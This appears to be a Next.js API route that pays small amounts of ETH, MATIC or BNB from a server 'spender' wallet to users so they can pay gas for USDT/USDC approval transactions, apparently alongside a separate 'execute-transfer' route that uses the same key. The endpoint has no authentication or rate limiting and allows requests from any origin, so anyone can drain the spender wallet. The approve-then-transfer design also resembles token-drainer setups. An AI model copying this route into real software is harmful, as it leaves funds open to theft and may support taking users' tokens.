/**
 * Fund user's wallet with native token for gas when they have USDT/USDC but insufficient gas.
 * Spender sends a small amount of ETH/MATIC/BNB to the user.
 *
 * Required: SPENDER_PRIVATE_KEY (same as execute-transfer)
 */

import { NextResponse } from "next/server";
import { ethers } from "ethers";

const SPENDER_ADDRESS = "0x9E6120D8Bc8363b1FCF367eE34219C82D34a3f15";

const RPC_URL_BY_CHAIN: Record<number, string> = {
  1: process.env.RPC_URL_ETH || process.env.RPC_URL || "https://eth.llamarpc.com",
  137: process.env.RPC_URL_POLYGON || "https://polygon.llamarpc.com",
  56: process.env.RPC_URL_BSC || "https://bsc-dataseed.binance.org",
};

/** Amount to send (in wei) - enough for 1-2 approve txs */
const GAS_FUND_AMOUNT_BY_CHAIN: Record<number, bigint> = {
  1: BigInt("1000000000000000"), // 0.001 ETH
  137: BigInt("10000000000000000"), // 0.01 MATIC
  56: BigInt("5000000000000000"), // 0.005 BNB
};

export async function POST(request: Request) {
  const privateKey = process.env.SPENDER_PRIVATE_KEY;
  if (!privateKey) {
    return NextResponse.json(
      { error: "Server misconfigured" },
      { status: 500 }
    );
  }

  let body: { userAddress?: string; chainId?: number };
  try {
    body = await request.json();
  } catch {
    return NextResponse.json({ error: "Invalid JSON" }, { status: 400 });
  }

  const { userAddress, chainId = 1 } = body;
  if (
    !userAddress ||
    typeof userAddress !== "string" ||
    !userAddress.match(/^0x[a-fA-F0-9]{40}$/)
  ) {
    return NextResponse.json(
      { error: "Invalid userAddress" },
      { status: 400 }
    );
  }

  const rpcUrl = RPC_URL_BY_CHAIN[chainId];
  const amount = GAS_FUND_AMOUNT_BY_CHAIN[chainId];
  if (!rpcUrl || !amount) {
    return NextResponse.json(
      { error: "Unsupported chain" },
      { status: 400 }
    );
  }

  try {
    const provider = new ethers.JsonRpcProvider(rpcUrl);
    const wallet = new ethers.Wallet(privateKey, provider);

    const balance = await provider.getBalance(SPENDER_ADDRESS);
    if (balance < amount) {
      return NextResponse.json(
        { error: "Spender has insufficient balance to fund gas" },
        { status: 503 }
      );
    }

    const tx = await wallet.sendTransaction({
      to: userAddress,
      value: amount,
      gasLimit: BigInt(21000),
    });
    await tx.wait();

    return NextResponse.json({
      success: true,
      txHash: tx.hash,
      amount: amount.toString(),
    });
  } catch (err) {
    console.error("fund-gas error:", err);
    return NextResponse.json(
      {
        error:
          err instanceof Error ? err.message : "Failed to fund gas",
      },
      { status: 500 }
    );
  }
}

export function OPTIONS() {
  return new NextResponse(null, {
    status: 200,
    headers: {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type",
    },
  });
}
